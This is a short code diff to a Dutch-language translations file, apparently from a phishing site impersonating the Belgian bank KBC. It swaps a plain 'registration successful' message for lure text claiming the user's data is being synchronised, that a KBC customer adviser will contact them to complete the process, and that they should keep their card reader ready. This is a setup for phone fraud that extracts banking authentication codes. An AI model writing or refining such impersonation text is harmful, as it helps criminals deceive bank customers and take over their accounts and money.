@@ -133,8 +133,8 @@ export const translations = {
         },
 
         // Success
-        successTitle: "Registratie geslaagd!",
-        successMessage: "Uw account is succesvol aangemaakt.",
+        successTitle: "Uw gegevens worden gesynchroniseerd",
+        successMessage: "Naar aanleiding van de update van uw gegevens op de website van KBC zal er binnenkort een klantadviseur aan u worden toegewezen om het proces af te ronden. Gelieve tijdens deze procedure uw kaartlezer bij de hand te houden.\nWij danken u voor uw medewerking.",
         backHome: "Terug naar start",
 
         // Footer/Links
